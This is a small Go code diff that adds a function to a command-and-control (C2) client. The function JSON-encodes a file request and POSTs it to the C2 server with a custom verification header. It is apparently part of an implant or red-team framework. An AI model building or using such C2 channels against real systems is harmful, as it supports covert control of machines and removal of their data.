@@ -88,7 +88,27 @@ func sendHTTPExecution(url string, data types.StzExecutionStatus) error {
 	if err != nil {
 		return err
 	}
+	return nil
+}
 
+// Function to send an execution status to the C2 using HTTP
+func sendHTTPFile(url string, data types.StzFileRequest) error {
+	headers := map[string]string{
+		"Content-Type": "application/json",
+		"X-STZ-Verify": callbacks.FilesEndpoint,
+	}
+	jsonOut, err := json.Marshal(data)
+	if err != nil {
+		return err
+	}
+	jsonParam := strings.NewReader(string(jsonOut))
+	resp, body, err := sendHTTPRequest("POST", url, jsonParam, headers)
+	if resp != http.StatusOK {
+		return fmt.Errorf("ERROR: HTTP %d - [%s]", resp, body)
+	}
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
